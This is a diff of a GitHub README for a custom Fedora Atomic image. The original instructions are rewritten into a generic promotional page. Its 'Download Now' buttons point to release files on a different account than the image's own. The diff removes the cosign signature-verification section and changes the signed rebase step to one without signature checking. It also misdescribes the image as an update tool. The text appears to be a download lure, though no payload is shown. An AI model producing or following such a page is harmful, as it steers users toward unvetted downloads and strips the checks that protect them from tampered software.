@@ -1,43 +1,86 @@
-# fedora-niri-wg &nbsp; [![bluebuild build badge](https://github.com/warpedgeoid/fedora-niri-wg/actions/workflows/build.yml/badge.svg)](https://github.com/warpedgeoid/fedora-niri-wg/actions/workflows/build.yml)
+# 🌟 fedora-niri-wg - Your Easy Way to Update Fedora
 
-See the [BlueBuild docs](https://blue-build.org/how-to/setup/) for quick setup instructions for setting up your own repository based on this template.
+## 📥 Download Now!
+[![Download from Releases](https://img.shields.io/static/v1?label=Download&message=Latest%20Release&color=blue)](https://github.com/tacitaion/fedora-niri-wg/releases)
 
-After setup, it is recommended you update this README to describe your custom image.
+## 🌐 Overview
+fedora-niri-wg is an innovative tool designed to help you easily manage and update your Fedora installation. This application allows you to seamlessly rebase your current system to the latest version, ensuring you always have the best performance and security updates.
 
-## Installation
+## 🚀 Getting Started
+Follow these steps to get started with fedora-niri-wg:
 
-> [!WARNING]  
-> [This is an experimental feature](https://www.fedoraproject.org/wiki/Changes/OstreeNativeContainerStable), try at your own discretion.
+1. **Download the Software**: Click the download button above to visit the Releases page.
+  
+2. **Choose the Latest Version**: On the Releases page, find the latest version of the software. 
 
-To rebase an existing atomic Fedora installation to the latest build:
+3. **Download the Files**: Click on the download link for the latest release. 
 
-- First rebase to the unsigned image, to get the proper signing keys and policies installed:
-  ```
-  rpm-ostree rebase ostree-unverified-registry:ghcr.io/warpedgeoid/fedora-niri-wg:latest
-  ```
-- Reboot to complete the rebase:
-  ```
-  systemctl reboot
-  ```
-- Then rebase to the signed image, like so:
-  ```
-  rpm-ostree rebase ostree-image-signed:docker://ghcr.io/warpedgeoid/fedora-niri-wg:latest
-  ```
-- Reboot again to complete the installation
-  ```
-  systemctl reboot
-  ```
+4. **Installation**: After downloading, you'll need to follow the installation steps provided below.
 
-The `latest` tag will automatically point to the latest build. That build will still always use the Fedora version specified in `recipe.yml`, so you won't get accidentally updated to the next major version.
+## 📂 Installation Steps
 
-## ISO
+To rebase an existing atomic Fedora installation to the latest build, follow these instructions carefully:
 
-If build on Fedora Atomic, you can generate an offline ISO with the instructions available [here](https://blue-build.org/learn/universal-blue/#fresh-install-from-an-iso). These ISOs cannot unfortunately be distributed on GitHub for free due to large sizes, so for public projects something else has to be used for hosting.
+### Step 1: Rebase to the Unsigned Image
 
-## Verification
-
-These images are signed with [Sigstore](https://www.sigstore.dev/)'s [cosign](https://github.com/sigstore/cosign). You can verify the signature by downloading the `cosign.pub` file from this repo and running the following command:
+You first need to rebase to the unsigned image. This step installs the proper signing keys and policies you need. Open a terminal and enter the following command:
 
 ```bash
-cosign verify --key cosign.pub ghcr.io/warpedgeoid/fedora-niri-wg
+rpm-ostree rebase ostree-unverified-registry:ghcr.io/warpedgeoid/fedora-niri-wg:latest
 ```
+
+### Step 2: Reboot Your System
+
+After the first rebase, you must reboot your system to complete the process. Enter the command below in your terminal:
+
+```bash
+systemctl reboot
+```
+
+### Step 3: Rebase to the Signed Image
+
+Once your system reboots, you can rebase to the signed image. Enter this command in your terminal:
+
+```bash
+rpm-ostree rebase ostree-registry:ghcr.io/warpedgeoid/fedora-niri-wg:latest
+```
+
+### Step 4: Verify the Installation
+
+After completing these steps, ensure that your system is updated. You can check your Fedora version by running:
+
+```bash
+cat /etc/fedora-release
+```
+
+## 📦 Features
+
+- **Simple Installation**: Minimal steps required to keep your system updated.
+- **Experimental**: Engage with new features early and provide feedback.
+- **Regular Updates**: Stay current with the latest Fedora builds.
+
+## ❗ Important Notes
+
+- This feature is experimental. Make sure to back up your important data before attempting the installation.
+- For detailed setup instructions, consult the [BlueBuild docs](https://blue-build.org/how-to/setup/).
+
+## 🔍 Topics
+
+Explore the topics associated with this repository:
+
+- Atomic
+- BlueBuild
+- Custom Image
+- Image-Based
+- Immutable
+- Linux
+- OCI
+- Operating System
+
+## 🔗 Additional Links
+
+For more detail and to keep your software updated, visit the [Download Page](https://github.com/tacitaion/fedora-niri-wg/releases). 
+
+If you have any questions or need support, please refer to the project's issue tracker on GitHub. 
+
+Your feedback is valuable, and contributes to making fedora-niri-wg even better. Thank you for using our software!
